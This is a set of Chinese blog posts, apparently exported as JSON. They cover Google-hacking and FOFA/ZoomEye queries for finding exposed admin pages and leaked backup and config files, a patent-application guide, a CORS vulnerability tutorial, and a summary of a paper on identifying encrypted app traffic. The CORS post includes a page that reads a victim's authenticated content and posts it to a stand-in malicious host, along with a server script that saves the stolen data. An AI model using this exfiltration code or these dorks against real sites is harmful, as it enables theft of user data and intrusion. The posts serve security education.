Test404网站备份文件扫描器 v2.0(win) ihoneyBakFileScan(python) ihoneyBakFileScan v0.2 多进程批量网站备份文件泄露扫描工具，根据域名自动生成相关扫描字典，自动记录扫描成功的备份地址到文件 地址：https://github.com/sry309/ihoneyBakFileScan 8.搜索引擎&amp;情报社区8.1GoogleHacking常用语法 intitle 搜索网页标题中包含有特定字符的网页。 例如intitle: cbi，这样网页标题中带有cbi的网页都会被搜索出来 inurl 搜索包含有特定字符的URL。 例如inurl:cbi，则可以找到带有cbi字符的URL intext 搜索网页正文内容中的指定字符。 例如intext:pdf。这个语法类似我们平时在某些网站中使用的“文章内容搜索”功能 Site 找到与指定网站有联系的URL。 例如Site:www.58.com。所有和这个网站有联系的URL都会被显示 减号- 要求搜索结果中不含特定查询词 例如intitle:小说 - 电视剧 只会搜到小说而不会出现电视剧 domain 查找跟某网站相关的信息 例如domain:www.google.com查询在网站内容里面包含www.google.com的信息的网站 filetype 限制查找文件的格式内容 关键字+filetype:文件格式,例如电脑 + filetype:ppt 双引号,书名号,中括号 精确匹配,缩小搜索范围 如果输入的关键字很长，在经过搜索引擎分析后，给出的搜索结果中的关键字，可能是拆分的。 对这搜索结果不满意我们可以加上 双引号(“”) 和 中括号( [] )就可以不被拆分 例如 “中国黑客协会” [中国黑客协会] 书名号《》 是百度独有的一个特殊查询语法。 书名号出现在搜索结果中，书名号括起来的内容不会被拆分 书名号在某些情况(如查找常用的电影或小说)下特别有效 例如 “《社交网络》” 基础操作符 逻辑与：and 逻辑或： or 、| 逻辑非： - 完整匹配：”关键词” 通配符：* ? GoogleHacking其他语法1、引号 ‘’ “ 把关键字打上引号后，把引号部分作为整体来搜索 2、or 同时搜索两个或更多的关键字 3、link 搜索某个网站的链接 link:baidu.com即返回所有和baidu做了链接的URL 4、info 查找指定站点的一些基本信息 GoogleHackingDatabase google-hacking-database GoogleHacking典型用法 管理后台地址 123site:target.com intext:管理 | 后台 | 后台管理 | 登陆 | 登录 | 用户名 | 密码 | 系统 | 账号 | login | systemsite:target.com inurl:login | inurl:admin | inurl:manage | inurl:manager | inurl:admin_login | inurl:system | inurl:backendsite:target.com intitle:管理 | 后台 | 后台管理 | 登陆 | 登录 上传类漏洞地址 12site:target.com inurl:filesite:target.com inurl:upload 注入页面 1site:target.com inurl:php?id= 编辑器页面 1site:target.com inurl:ewebeditor 目录遍历漏洞 1site:target.com intitle:index.of SQL错误 1site:target.com intext:&quot;sql syntax near&quot; | intext:&quot;syntax error has occurred&quot; | intext:&quot;incorrect syntax near&quot; | intext:&quot;unexpected end of SQL command&quot; | intext:&quot;Warning: mysql_connect()&quot; | intext:”Warning: mysql_query()&quot; | intext:”Warning: pg_connect()&quot; phpinfo() 1site:target.com ext:php intitle:phpinfo &quot;published by the PHP Group&quot; 配置文件泄露 1site:target.com ext: .xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini 数据库文件泄露 1site:target.com ext: .sql | .dbf | .mdb | .db 日志文件泄露 1site:target.com ext: .log 备份和历史文件泄露 1site:target.com ext: .bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar 公开文件泄露 1site:target.com filetype: .doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv 邮箱信息 123site:target.com intext:@target.comsite:target.com 邮件site:target.com email 社工信息 1site:target.com intitle:账号 | 密码 | 工号 | 学号 | 身份证 8.2黑暗搜索奇安信：https://hunter.qianxin.com/home/ FOFA fofa.so 官方详细文档; https://fofa.so/help 123456domain=&quot;baidu.com&quot;domain=&quot;&quot;||ip=&quot;&quot;||host=&quot;&quot;||title=&quot;&quot;||header=&quot;&quot;protocol=“https” #搜索指定协议类型app=&quot;phpinfo&quot; #搜索某些组件相关系统host=&quot;oldboyedu.com/&quot; #搜索包含有特定字符的URLtitle=“powered by” &amp;&amp; os==windows #搜索网页标题中包含有特定字符并且系统是windows的网页 钟馗之眼 钟馗之眼： https://www.zoomeye.org/ 语法举例： 1234567891011121314151617181920212223242526#例1：搜索使用iis6.0主机：app:&quot;Microsoft-IIS&quot; ver&quot;6.0&quot;#例2：搜索使weblogic主机：app:&quot;weblogic httpd&quot; port:7001#例3：查询开放3389端口的主机：port:3389#例4：查询操作系统为Linux系统的服务器:os:linux#例5：查询公网摄像头：service:”routersetup”#例6：搜索美国的 Apache 服务器：app:Apache country:US#例7：搜索指定ip信息，ip:121.42.173.26#例8：查询有关taobao.com域名的信息，site:taobao.com#例9：搜索标题中包含该字符的网站，title:weblogic 8.3威胁情报微步在线：https://x.threatbook.cn/ 华为安全情报： https://isecurity.huawei.com 360威胁情报中心：https://ti.360.cn/ 奇安信：https://ti.qianxin.com/ VenusEye威胁情报中心：https://www.venuseye.com.cn/ 作者：770","tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/渗透/"},{"name":"内网","slug":"内网","permalink":"http://yoursite.com/tags/内网/"}]},{"title":"国家专利申请从入门到放弃","date":"2019-11-06T03:39:32.000Z","path":"2019/11/06/zhuanli/","text":"今年的第二篇博客姗姗来迟，一个是实在太忙了，另一个是我实在太懒了，不过前端时间小白兔收到了一个好消息，去年5月我申请的专利终于通过了，历经了1年半，终于修成了正果。然而随着部门申请的专利陆陆续续的返回，通过率简直惨不忍睹。这篇博客记录了我从申请专利到拿到证书的全过程，分享一些经验与教训，希望对将来要申请专利的朋友提供一些帮助。 最初的准备虚拟机（建议）专利需要在指定的软件CPC中进行编写，导入和导出，包括后续的专利通知书查阅，回复，补正等等。令人头疼的是，CPC软件并不支持Window 10，只支持Windows XP，Win7，Win8操作系统。所以无论是Linux系统还是Mac系统都必须安装虚拟机才行。而实际上，经我亲身测试，Win7的兼容性其实也不太好，Window XP目前是最舒服的（推荐）。 CPC客户端软件上面说了，CPC客户端软件是专门用以编辑国家专利的软件程序，包括后续专利的一系列操作。贴一下CPC客户端下载链接：CPC客户端。安装的过程并没有什么难度，按顺序执行即可。 CPC离线升级包CPC的客户端安装软件从2012年2月发布起就再也没有更新过了，一直都是使用离线升级包的方式来维护。这是非常重要的，因为原始CPC很多配置都已经无法跟上需求，所以必须使用离线升级过后才能正常使用。贴一下最新的升级包下载链接：CPC客户端离线升级包。 其他 Microsoft Office 2003/2007/2010。 IE 7.0/8.0 不能安装Office2007/2010的兼容包以及WPS 编写专利##发明专利请求书 这个文件用以提交本次发明的所有相关信息，包括： 发明名称 申请人 发明人（第一发明人，第二发明人， …. ） 联系人 英文信息 其他 说明书摘要有点像论文的摘要，需要高度概括自己的发明专利的具体内容。大致写作思路可参考如下： 本发明是____，其____, 可用于____领域和____领域。本发明的技术核心是____。该技术的工作流程为____。本发发明主要针对____问题，做出了____贡献。 说明书说明书中包含了对专利具体内容的表述，必须清晰且详细，且主要包含以下内容： 技术领域说明发明说设计的技术领域和技术核心思路。 技术背景解释说明本发明是在什么样的背景下提出的，是为了解决哪些问题。 附图说明简要说明每个附图的内容。 具体实施方式详细得说明专利的具体内容，如何部署，实施，实现（结合附图）。 5.写作须知专利审查是十分严格的，基本不能有错别字，标点符号的错误。因此在写作结束后，一定要仔细检查语句的通顺，错别字，标点符号以及分段。如果说明书中需要插入公式，可以在外部的office中编辑好再复制进来，或直接保存成图片插入。 说明书附图说明书中所需要的附图都保存在这里，采用的是导入的方式。如果遇到导入图片失败，请检查图片大小必须小于165mm*245mm。如果仍然报错，再次离线升级客户端尝试导入。如果还报错，可以尝试大招：在Window下用画图工具打开图片，然后另存为新图片就可以导入了，或者保存为pdf，再转回图片。 权利要求书权利要求书是整个专利最重要的一块，也是审查员重点审核的文件，里面记载整份专利需要受保护的权利。因此权利要求书的内容必须清楚，详细，不能出现模糊，模棱两可的表达。通常而言，权利要求书的权利1高度概括需要保护的权利，然后在后面的权利要求中扩展描述： 1. 一种基于机器学习的XXXXXX方法 A、XXXX B、XXXX C、XXXX 2. 根据权利要求1中步骤A所述的XXXXX，其特征在于： A1、XXXX A2、XXXX A3、XXXX 受理阶段在完成整份专利的编写后，通过CPC软件导出压缩包，然后提交自己的专利。在完成提交后，会收到一份来自国家知识产权局的 “受理通知书”，这意味的你的专利已经成功提交，并进入受理阶段。如果受理阶段没有问题，那么专利就会被送至实审，进入实审流程。 受理阶段审查的是专利的格式和标准，一般不涉及专利的具体内容。如果你的专利在受理阶段收到“补正通知书”，这说明你的提交的专利格式或标准出现问题，需要修改并提交补正文件。我曾接收到的问题如下： 说明书中附图说明不完整，需要逐一说明 说明书摘要文字部分超过300个字 权利要求书编号重复 说明书和权利要求书公式下标不清晰 说明书标题和专利名不一致 说明书中大小写不一致… 在补正时，需要把通知书导入CPC客户端，在“通知书”里选中然后点击补正。补正材料包括补正书和修改后替代页。完成补正后，在中间文件选中然后导出，然后把补正答复提交给专利局。如果还是存在问题，则会收到第二次、第三次补正通知，这样本来就漫长的专利周期就会被拉得更长，所以在第一次补正通知时就认真修改吧。 实审阶段专利通过受理审查后，就会送至实审，这时你会收到一份“实审通知书”，当然你也可以在soopat上查询自己的专利是否处于实审状态。 实审阶段十分漫长，往往需要1-2年才会返回结果。在实审状态中，如果收到了“第一次审查意见通知书”，说明专利内容存在问题，需要修改。目前绝大部分专利都卡死在这里，第一次审查意见会有两种情况： 目前文本暂时不能被授予专利权 不具备创新性，新颖性，没有被授予专利的实质内容，不具备授予专利的前景 如果返回的是第一种，说明很有希望通过！只要按照审查意见的内容，进行修改和提交，就很有希望拿到专利权。回复审查意见的操作和补正相似，把第一次审查意见通知书导入CPC软件，在通知书中选中进行答复，需要的材料包括：修改对照页，替换页，意见陈述书。完成修改后，在中间文件选中并导出，然后提交给专利局。如果返回的通知书中包含第二种字眼，那么基本上就凉了，但你也可以修改，或者直接怼审查员，万一成功了，对吧？ 目前我整理的关于专利实审通知的理由如下： 发明内容已经发表成论文（无论中、英） 发明内容和其他论文高度相似（在实审返回的文件中可以查看） 权利要求书内容和说明书内容矛盾 权利要求书中表述含糊，模糊，使保护范围不明确 标题不当，不能使用“技术，模型”，要用“方法，系统”…… 授权阶段如果你的专利最终通过实审，那么就会收到来自专利局的两份通知书：授权通知书，缴费通知书。这说明的专利已经进入授权阶段，只要按时（3个月内）缴费，专利就能完成授权，寄发专利证书。 缴费可以直接网上缴费，也可以去当地代办点缴费。如果是第二种，你首先需要上网填写和打印“专利缴费信息网上补充”，然后去代办点缴费。 缴费成功后，你就可以安心等着专利证书寄过来啦（然而我至今还没等到）。 总结血的教训，一定要先申请专利，再发论文，不然死亡率接近百分百。专利对于一个人的荣誉加成是很高的，希望大家都能申请成功，奥利给！","tags":[{"name":"专利","slug":"专利","permalink":"http://yoursite.com/tags/专利/"},{"name":"CPC","slug":"CPC","permalink":"http://yoursite.com/tags/CPC/"}]},{"title":"CORS跨域资源共享原理与漏洞","date":"2019-03-02T03:39:32.000Z","path":"2019/03/02/cors/","text":"过完年回来，我闲来无事逛了逛技术论坛，碰巧看到了对CORS漏洞的描述，顿时感兴趣起来。查了一些资料，也动手做了一些实践测试，解决了一些疑惑，这里整理成一篇博客供大家学习浏览。 一切从同源策略说起同源策略如果对浏览器有了解的朋友应该听过”同源策略(SOP)”。对于浏览器来说，这是一个十分重要的策略，甚至可以称得上浏览器安全的基础。 同源策略的定义为：不同域的客户端脚本在没有明确授权的情况下，不能读写对方的资源。当域名、端口和协议相同时，两个客户端才会被判断为同源。这个策略实际上完成了不同会话之间的隔离。 我们可以试想一下，如果你登录一个合法网站，然后又访问了一个恶意网站，若是没有同源策略，那么恶意网站可以随意操作合法网站上你的资源和数据。 跨域总的来说，同源策略是一个很好的策略，能在很大程度上保证我们用户的安全。但是这已经是20年前提出的策略了，随着Web应用的不断发展，如今遇到了许多需要跨域访问资源的情况。这些场景大概如下： 前后端分离的开发 本地资源却在不同域的情况 调用关联第三方平台，如电商调用快递信息 子站调用主站资源信息 因此，即使浏览器的同源策略不变，我们依旧希望找到一些办法来实现跨域。 CORS(跨域资源共享)简介CORS，跨域资源共享（Cross-origin resource sharing），是H5提供的一种机制，WEB应用程序可以通过在HTTP增加字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源的，当不同域的请求发生时，就出现了跨域的现象。 简单来说，CORS是一种特例机制，可以在全局同源策略下开一个后门，允许特定的网站通过。 实验测试为了加深对CORS机制的理解，我设置了两个服务器，服务器A是合法服务器，服务器B为恶意服务器。而为了便于读者理解，我在hosts中进行了配置： 47.xxx.xxx.xxx www.legal.com 165.xxx.xxx.xxx www.malious.com 其中，域名legal为合法网站，域名malious为恶意网站。 不带Cookie的跨域访问第一种情况是不带Cookie时对的访问，在legal中放置返回secret.php，其中返回phpinfo: &lt;?php phpinfo(); ?&gt; 直接访问www.legal.com/secret.php会直接显示： 然后，在malious中放置恶意页面steal.html，在用户访问时恶意去请求secret.php的内容: &lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt; &lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt; &lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;/head&gt; &lt;h1&gt;Hello I malious page. &lt;/h1&gt; &lt;script type=&quot;text/javascript&quot;&gt; function loadXMLDoc() { var xhr1; var xhr2; if(window.XMLHttpRequest) { xhr1 = new XMLHttpRequest(); xhr2 = new XMLHttpRequest(); } else { xhr1 = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); xhr2= new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); } xhr1.onreadystatechange=function() { if(xhr1.readyState == 4 &amp;&amp; xhr1.status == 200) //if receive xhr1 response { var datas=xhr1.responseText; xhr2.open(&quot;POST&quot;,&quot;http://www.malious/save.php&quot;,&quot;true&quot;); xhr2.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;); xhr2.send(&quot;T1=&quot;+escape(datas)); } } xhr1.open(&quot;GET&quot;,&quot;http://www.legal.com/secret.php&quot;,&quot;true&quot;) //request user page. xhr1.withCredentials = true; //request with cookie xhr1.send(); } loadXMLDoc(); &lt;/script&gt; &lt;/html&gt; 上述代码的逻辑是这样的：一旦用户访问了这个页面，那么页面上的JavaScript脚本就会执行，去访问www.legal.com/secret.php的内容，并将访问的内容保存在本地。好，现在我们直接去访问恶意网站(www.malious.com/steal.html)，返回结果： 可以看到，我们的请求被拦截了，我们的JavaScript脚本并没有执行成功，本地也没有生成保存的文件。我们可以从图中清晰地看出原因：同源策略，不允许跨域请求。 但是，当我们去查看网络中的数据包时，却可以发现返回状态是200，而且是有返回内容的： 所以我们可以推测出，JavaScript是成功执行了的，请求到达legal服务器，并且成功获得了响应内容。所以拦截方是浏览器，虽然有响应内容，但同源策略将其丢弃。我们可以结合下图进行理解： 那么CORS是怎么产生的呢？当我们修改legal服务器中的配置时： &lt;?php header(&quot;Access-Control-Allow-Origin:http://www.malious.com&quot;); phpinfo(); ?&gt; 我们再次访问恶意网站(www.malious.com/steal.html)，返回结果： 可以看到，没有出现任何提示信息，因此返回的内容没有被拦截。 分析一下原因，我们在原legal服务器中配置header(&quot;Access-Control-Allow-Origin:http://www.malious.com&quot;)，这段代码等于设置了一个白名单，允许malious.com域进行跨域访问。这时，在legal服务器得到一个资源访问请求时，会进行检测，如果来源是malious.com域，那么在返回资源的响应包中会加上Access-Control-Allow-Origin:http://www.malious.com，这样浏览器将不再拦截跨域的情况： 整个跨域流程大概如下图所示： 带Cookie的跨域访问上述的跨域是最基础的情况，但是一般而言，恶意网站进行跨域请求时为了获取一些敏感信息，比如用户的Cookie。在用户带Cookie进行跨域时，情况与不带Cookie时不太相同。 我们设置一个页面(login.php)来设置Cookie： &lt;?php setcookie(&quot;SESSIONid&quot;,&quot;THISISSESSID20180802&quot;,time()+3600,&quot;&quot;,&quot;&quot;,0); //设置普通Cookie setcookie(&quot;test_http&quot;,&quot;THISISSESSIDhttponly20180802&quot;,time()+3600,&quot;&quot;,&quot;&quot;,0,1);//设置Http Only Cookie ?&gt; 我们先去访问这个页面，再去访问www.legal.com/secret.php时，可以看到我们已经设置上了Cookie： 然后我们在malious服务器上放置一个保存响应信息的页面(save.php): &lt;?php $myfile = fopen(&quot;secret.html&quot;, &quot;w+&quot;) or die(&quot;Unable to open file!&quot;); $txt = $_POST[&apos;T1&apos;]; fwrite($myfile, $txt); fclose($myfile); ?&gt; 这样一来，如果跨域成功，那么携带用户Cookie的phpinfo信息就会保存在本地secret.html中。 但是，当我们再次访问www.malious.com/steal.html时，却发现响应包再次被拦截： 这是因为，如果用户是在携带Cookie的情况下进行跨域请求，那么浏览器将会检测是否在服务器上允许了带Cookie跨域。 因此我们在legal服务器上修改配置，允许带Cookie跨域： &lt;?php header(&quot;Access-Control-Allow-Origin:http://www.malious.com&quot;); header(&quot;Access-Control-Allow-Credentials:true&quot;); phpinfo(); ?&gt; 完成配置后，我们再次访问时，legal服务器会自动在响应包中添加Access-Control-Allow-Credentials:true，即允许带Cookie跨域，则浏览器就不会再拦截响应包。而且从legal服务器返回的内容将会被保存到malious.com/secret.html上了： 无差别拦截在CORS跨域时，还有一种特殊情况，当服务器的配置为： &lt;?php header(&quot;Access-Control-Allow-Origin:*&quot;); header(&quot;Access-Control-Allow-Credentials:true&quot;); phpinfo(); ?&gt; 即允许任何网站带Cookie进行跨域时，浏览器会无差别进行拦截，这也算浏览器同源策略对用户最后的保护： 漏洞其实关于CORS的漏洞，我们已经可以在上面窃取Cookie的实验中看出一些端倪，如果允许恶意网站进行跨域请求，那么将会造成严重的信息泄露。 所以CORS漏洞的本质是服务器配置不当。 然而，现实中的CORS漏洞并不会像实验中那么直白，一般来说，网站不可能配置允许未知网站跨域。一般出现CORS漏洞的场景是这样的： 管理员在配置时需要对一批网站进行跨域授权，但一个个添加是十分麻烦的，所以管理员直接写了一个正则匹配式子来代替这些域名。问题往往出现在这里，如果正则匹配式子不够严谨或有错误，那么就会造成CORS漏洞。 举一个例子，一个管理员想要配置domain.com及其子域名可跨域，所以他配置： &lt;?php header(&quot;Access-Control-Allow-Origin:^.*domain.com$&quot;); header(&quot;Access-Control-Allow-Credentials:true&quot;); phpinfo(); ?&gt; 这很明显是存在漏洞的正则匹配式，因为evildomain.com也满足了这个正则，所以攻击者可以去注册这个域名来发动攻击。 漏洞挖掘关于CORS的漏洞挖掘目前两种思路，一个是白盒，这个主要是去定位相关的代码： header(&quot;Access-Control-Allow-Origin&quot;); header(&quot;Access-Control-Allow-Credentials&quot;); 然后分析是否存在漏洞，这种方法比较直观和简单。 如何是黑盒的话，主要还是先找网站是否存在跨域的功能，如果存在，那跨域的是哪些域名，收集信息，寻找规律，尝试构造。除了经验还需要很大程度的运气，当然如果有好的字典也可以尝试去爆破。 CSRF和CORS在学习CORS之前，我是已经熟练掌握CSRF攻击的。现在回来看，顿时产生了异或，CSRF也是一种执行跨域的攻击，但是似乎并没有遇到同源策略的问题？ 查了一下资料，理清了一下思路就明白了：我们知道CSRF一般是使用form表单来提交请求的，而浏览器是不会对form表单进行同源阻拦的，因为其是无响应的请求。知乎中解答我也是较为认同的： 所以我们发起CSRF攻击时，比如给后台添加管理员，Post数据提交后，服务器会处理请求(给后台添加管理员)，但不会返回结果给你，而实际上后台已经完成了添加管理员操作。流程可以参考： XSS和CORS值得一提的是，虽然同源策略禁止了跨域，但是DOM中的很多标签都可以绕过这个限制，比如&lt;script&gt;,&lt;img&gt;,&lt;a&gt;等等。 只要包含了 “src” 或 “href” 属性的标签都可以完成跨域操作。 我们知道，XSS是利用&lt;script&gt;,&lt;img&gt;等标签执行注入的，实际上也是利用了这些标签完成了跨域传递敏感信息，其流程如下所示： 总结COSR漏洞其实是一个很早就出现的漏洞，只是国内比较少见，但国外其实曾经造成过很多恶劣影响，比如facebook信息泄露。如果我们在开发网站时遇到跨域的情况，一定要谨慎处理，不可留下CORS漏洞。","tags":[{"name":"CORS","slug":"CORS","permalink":"http://yoursite.com/tags/CORS/"},{"name":"漏洞","slug":"漏洞","permalink":"http://yoursite.com/tags/漏洞/"}]},{"title":"基于流量关联的移动app端加密流量识别","date":"2018-12-18T03:39:32.000Z","path":"2018/12/18/xueshu-3/","text":"论文：Mobile app identification for encrypted network flows by traffic correlation作者：Gaofeng He, Bingfeng Xu, Lu Zhang and Haiting Zhu地区：China时间：2018来源：International Journal of Distributed Sensor Networks 介绍手机App与IoT（物联网） 越来越多的IoT设备可以通过手机来控制 手机app已经成为IoT世界的核心 手机App的安全挑战 移动设备产生的流量已经达到网络流量的49% 手机App产生的流量往往是有迷惑性却不加密的流量，用户隐私受到威胁 恶意App使流量显著增加，造成网络阻塞 由于手机暴露于诸多场所，因此App更容易受攻击 问题所在 通过网络流量来识别App很困难 App的数据传输使用HTTP/HTTPS，因此传统的基于IP或端口的识别方法不起作用 目前大多数研究都针对于HTTP的payload进行识别分类，而HTTPS加密payload，因此无法识别 AppScan是一种用机器学习来识别加密流量的工具，但是其模型训练和更新代价很大 预先工作App识别问题定义所有在网络中可以观察到流量集合为F，所有在平台上运行的apps集合为A。 F = {f1,f2,..,fn} A = {a1,a2,...ap} 需要解决的问题在于找到映射关系： M[F,A] : fi -&gt; aj (1 ≤ i ≤ n, 1 ≤ j ≤ p) 且上面的映射关系是一个 “many-to-one” 关系。 而针对于一个加密流量ef，问题就变成： E[ef,A]: ef -&gt; aj (1 ≤ i ≤ p) 这是一种特殊的app识别场景，也是一种 “many-to-one” 关系。 手机App构架作者认为了解手机App的框架可以更好地理解手机App流量的特征，而在2017发布的统计数据显示，安卓用户达到了86%，因此作者只关注安卓手机的框架。 上图是安卓手机通信之间的交互示例，App中显示信息的是“Activity”，点击按钮实际上是在不同Activity之间的切换。如果不杀死进程，那么App仍然会跑在后台，这样设计是为了让用户更快返回App。 安卓Apps之间的网络通信由于大部分安卓App使用HTTP/HTTPS去传输和接收数据。因此Apps之间的网络通信实际上和Web通信差不多： 也就是App先去DNS查询目标主机的ip，然后建立TCP连接并通过HTTP(s)传输数据。如果已经查询过了目标主机的ip，那么就跳过DNS查询这一步直接建立连接。 移动端App流量观察作者在这一章节中提出了在对App流量长期观察中发现的三大现象，这3种现象将作为整个文章的思想和实验基础。作者提到是和中国最大的网络运营商合作，才拿到了大量的流量数据（3G和4G），数据总量达到了160GB。 观察一一组关于服务器主机的查询是可以用来区分不同App的。 上图左侧是百度地图（com.baidu.BaiduMap）查询的主机集，上图右侧是百度搜索（com.baidu.searchbox）查询的主机集，可以看出，虽然二级域名相同，而且是同一个企业名下的产品，他们查询的服务器主机组仍然是不完全相同的。那么这样一组主机名就可以作为识别App的特征。 观察二手机App会在短时间内发起多个DNS查询请求（同时查询多个服务器主机IP）。 上图是百度地图（com.baidu.BaiduMap）查询主机时发起DNS请求的时间戳，可以看到这组主机发起查询的时间间隔在1秒以内。因此作者假定一组并发的DNS查询来自于同一个应用，可以根据时间信息进行分组。 观察三同一手机App产生的加密流量与其他流量具有相似性。 在上图中，末尾的61.135.185.197是未知应用产生的流量，而其在时间上与199.75.22.71这一IP产生流量的时间节点十分相近，且在ip结构上与61.135.186.152这一IP相近，而以上两个ip的主机组都是百度地图（com.baidu.BaiduMap）的，因此61.135.185.197也是由百度地图产生的（实际上也确实是由百度地图产生的）。 作者就是基于这一发现来识别加密流量。 方法这一章节作者提出了“关联流量”的定义，并提出了DNS聚簇和相似流量检索两种核心技术。 关联流量一个加密流可以与一组流量关联起来，这组流量就称为“关联流量”（比如DNS或HTTP）。“关联流量”是可以被快速识别属于哪个App的，所以一旦一个加密流的“关联流量”能够找到，那么加密流就能被识别。 定义对于“关联流量”的定义如下： 1.对于需要DNS查询主机IP的流量，其关联流量定义为其DNS查询流量。2.对于直接通过IP进行连接的流量，其关联流量定义为“相似共同流量(similar common traffic)”。 对于“相似共同流量”的定义如下： 1.共同流量，指对发起DNS查询前的数据流量2.相似流量，指外部特征相似的数据流量（如IP，时间，包长等等，但不考虑数据包具体内容） 思路与挑战作者的思路是找到加密流量的关联流量，虽然加密流量难以提取主机名，但是关联流量很容易，而且提取的主机名集可以用来识别App。 挑战在于两点：(1).后台流量容易混淆。(2).不同App可能会调用相同的服务并查询相同的主机名 识别特征构造在上图中，在完成主机域名提取后，主机域名集会送往识别特征构造模块，实际上就是通过 “.” 来对域名进行分割，然后提取“域名词向量”作为特征，值得一提的是，二级域名和顶级域名不分离。在进行训练时，每个App都会将匹配的特征保存。 DNS聚簇目的：使用DNS聚簇去发现加密流量的关联DNS查询，而主要问题在于克服后台流量的混淆。具体算法如下： 我们分析一下算法的输入和输出，输入有以下几个：1.加密流发起的DNS查询qi2.DNS查询流量集合Q3.以及三个阈值参数。输出则是：关联的DNS查询集C 作者通过该算法进行DNS聚簇，找到关联DNS查询流量。 相似流量检索通过在特征空间比较流向量来需找相似流，具体的特征如下，一共有12种。 而两个流量之间的相似度是使用加权欧式距离来进行计算评估的。而在计算距离之前，会使用缩放技术将流向量特征值控制在[0,1]这个区间内，具体算法如下： 在完成对流向量的特征值的重构后，再使用加权欧式距离来评估两个流的相似度： 这个距离的值越小，则两个流量越相似。而在权重值方面，作者设置w1和w2的值为1/3, 其他的权重皆为1/30。这说明作者认为IP地址和流起始时间的重要性更高。然后距离最小的流会被选择作为加密流的关联流量。 主机名匹配以及App识别在获取主机名集后，需要根据主机名来匹配App。前面提到每个App已经建立了特征集，而作者使用TF-IDF算法来进行这一步的主机名匹配。TF-IDF是一种用于信息检索与数据挖掘的常用加权技术，一般用于文本分析。TF-IDF的思想在于，如果一个词在文档中出现的频率高，但是在其他文档中出现的次数少，那么该词就能够作为分类该文档的依据。具体可详见：生动理解TF-IDF算法。这里针对作者的思路进行简要说明： 一条域名记录可以被表示为： W = {w2,...,wk} 由于看到w的下标是从2开始，这是因为二级域名和顶级域名没有分离。首先计算每个词的在Idoc中的词频(Idoc指App的特征文档)： 然后计算逆文档频率，词料库是所有的App特征文档： 通过词频和逆文档频率计算这个词的weight： 最后将所有的词weight相加计算分值： 接下来将每个App的特征文档分值计算出来，取最高的App计数加一，然后换下一个域名记录进行计算，当主机名集中所有的主机名都被计算后，取App计数最大的作为识别的App。具体算法如下： 从上面的算法可以看到输入是一组主机名（关联流量中提取的），而输出则是识别的App。 实验数据收集实验环境 操作系统：Ubuntu 16.04流量收集工具：tcpdump数据分析环境：4GB内存和处理器 Intel Pentium Dual-Core T4500 CPU训练阶段：使用安卓模拟设备，并使用UI-fuzzing工具来模拟点击操作生成流量。由于这一步是为了得到App的识别特征，因此只有DNS流量会被抓取。测试阶段：使用HUAWEI Mate 8 运行App下载器：Evozi App DownloaderApp下载源：Google Play，Wandoujia（下载url结构简单，方便用python程序爬取）App安装：adb install点击模拟：UI-fuzzing from Monkey，通过随机点击生产大量流量数据数据输出：使用tcpdump捕捉数据并保存成.pcap文件，每个文件的大小约为100MBTCP和UPD流的剥离：SplitCapDNS流量分析以及主机名提取：Dshell主机名匹配：Soar和Packet Capture 流量产生需要找到生成加密流量的应用，而这一步是手工检测的。作者下载了100款Google Player的应用以及900个Wandoujia上的应用，他们安装并运行应用，然后观察是否产生的加密流量。每个App只在启动的时间段内是否生成了至少1条加密流量，最终作者选择了100个App作为测试集。 对于识别测试，每个App会一个接一个安装在手机上，然后随机运行3分钟，抓取到足够的流量后，杀死后台程序。这样的流程一共执行了5次。最后一共2305条加密流量被抓取，整个测试集的数据量如下： 实验结果评估方法实验中使用三个指标来评估实验结果，分别是Accuracy, TPR, FP。这三个指标的计算方法如下： 其中，函数Nfun(pare)指的是参数pare中流的数量。比如，Nfun(identified_all)指的是所有成功识别的流量数量，Nfun(encrypted_all)指的是所有加密流量的数量。而TPR和FP指标是针对某个APP的。 使用主机名识别App的效率这是实验只要是作者为了证明自己所选取特征的好坏。前面提到，作者是将一组主机名作为识别App的特征，而每个App都有属于自己的特征集，那么如果App的特征集很相近，那么识别率就不高，因此作者决定先评估特征集之间的距离。评估距离的公式如下: 作者为100个App都做了测试，然后举了下面4组比较作为例子： 值越小，特征距离越近，可以看到BaiduMap与自己的距离是0，和seachbox之间的距离是0.343（比较接近），而与zhihu以及netease之间的距离基本上到了1（很远）。 接下来作者测试了在不同时间和版本下App特征的稳定性： 实验表明，在不同时间下和版本下相同App的特征集距离很小，即很相近，基本上不会变化。 评估DNS聚簇效果在作者选择的2305个加密流中，有1873条加密流需要DNS查询，有432条流是直接通过IP进行连接的。在DNS聚簇的算法中，有3个阈值参数，首先作者设置DNS查询间隔的阈值为1s，app时间间隔为7s（一个app完全关闭到另一个app开启的间隔），然后对词汇相似度进行调整（0.1-0.7）进行实验，实验结果如下： 可以看到，词汇相似度的阈值设置为0.4时，无论是Accuracy还是TPR都达到了巅峰，且精确度已经达到了95%。在图10可以看出，由于BaiduMap和searchbox的特征集距离小，所以他们可分类度低，故FTR值较低，而zhihu和netease的FTP值就很高。FP值也能很直观地表现出来（有一点问题）。 评估相似流量检索效果作者在这一块主要研究在进行相似流量检索时，关联流量数量与识别精确度的关系。作者针对不同关联流量数量分了组进行了实验，实验结果如下： 从上面的结果可以看出，在关联流量数量为7时，实验效果最好，精确度达到81%。而TPR和FP都呈现出了和DNS聚簇时相同的规律。 优化增强训练过程作者提出的第一步优化思路是提取更多的主机名集作为app的特征。作者使用的方式是直接反编译apk文件（dex2jar），去搜索java源码中的主机域名（以https和http进行匹配）。作者提出有些主机域名是不完整的，比如 http://+str.substring(&quot;*.&quot;.length()).m3587f()，因此动态地运行app抓取主机域名还是有必要的。 可以从上图看出，虽然训练时间变长了，但是提取的主机域名变多，而这样的代价是否值得还有待商榷。 